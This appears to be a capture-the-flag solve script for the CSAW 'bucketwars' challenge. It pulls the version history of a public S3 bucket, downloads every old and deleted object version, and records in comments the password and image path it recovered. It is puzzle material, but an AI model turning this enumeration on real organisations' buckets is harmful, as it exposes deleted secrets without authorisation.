import requests
from xml.etree import ElementTree


# Trying to access an invalid URL reveals the bucket name:
# An Error Occurred While Attempting to Retrieve a Custom Error Document
# * Code: NoSuchKey
# * Message: The specified key does not exist.
# * Key: https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/404.jpg


def search_history():
    # https://docs.aws.amazon.com/AmazonS3/latest/userguide/list-obj-version-enabled-bucket.html
    versions_xml = requests.get("https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions").text

    tree = ElementTree.fromstring(versions_xml)
    assert tree.tag == "{http://s3.amazonaws.com/doc/2006-03-01/}ListVersionsResult", tree.tag

    for child in tree:
        if child.tag in ("{http://s3.amazonaws.com/doc/2006-03-01/}Version", "{http://s3.amazonaws.com/doc/2006-03-01/}DeleteMarker"):
            info = {}
            for version_info in child:
                info[version_info.tag.removeprefix("{http://s3.amazonaws.com/doc/2006-03-01/}")] = version_info.text

            assert "Key" in info
            assert "VersionId" in info

            filename = info["Key"]
            version_id = info["VersionId"]

            # https://docs.aws.amazon.com/AmazonS3/latest/userguide/RetrievingObjectVersions.html
            if version_id != "null":
                path = f"{info['Key']}?versionId={info['VersionId']}"
            else:
                path = info["Key"]

            versioned_file = requests.get(f"https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/{path}").content
            with open(f"out/{version_id}-{filename}", 'wb') as out:
                out.write(versioned_file)
            print(filename, version_id, len(versioned_file))
    # Yields a password (t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB-index_v1.html): versions_leaks_buckets_oh_my
    # and an image (t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB-index_v1.html): https://asdfaweofijaklfdjkldfsjfas.s3.us-east-2.amazonaws.com/sand-pit-1345726_640.jpg
    # Image path is equivalent to https://s3.us-east-2.amazonaws.com/asdfaweofijaklfdjkldfsjfas/sand-pit-1345726_640.jpg


def main():
    search_history()
    # Teammate solved the rest of the challenge, seems it was some zsteg stego thing


if __name__ == '__main__':
    main()
